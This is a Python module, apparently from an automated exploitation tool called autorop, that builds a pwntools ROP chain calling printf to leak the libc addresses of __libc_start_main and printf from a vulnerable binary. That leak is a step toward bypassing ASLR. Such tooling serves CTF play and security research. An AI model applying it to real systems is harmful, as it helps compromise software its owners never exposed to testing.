from autorop import PwnState, arutil, constants
from pwn import context, ROP, ELF, log, align


def printf(state: PwnState) -> PwnState:
    """Leak libc addresses using ``printf``.

    This function leaks the libc addresses of ``__libc_start_main`` and ``printf``
    using ``printf``, placing them in ``state.leaks``.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``overwriter``: Function which writes rop chain to the "right place".
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.

    Returns:
        Reference to the mutated ``PwnState``, with the following updated

            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    LEAK_FUNCS = ["__libc_start_main", "printf"]

    def leaker(rop: ROP, address: int) -> ROP:
        arutil.align_call(rop, "printf", [address])
        # must send newline to satisfy ``arutil.leak_helper``
        arutil.align_call(rop, "printf", [next(state.elf.search(b"\n\x00"))])
        return rop

    return arutil.leak_helper(state, leaker, LEAK_FUNCS)
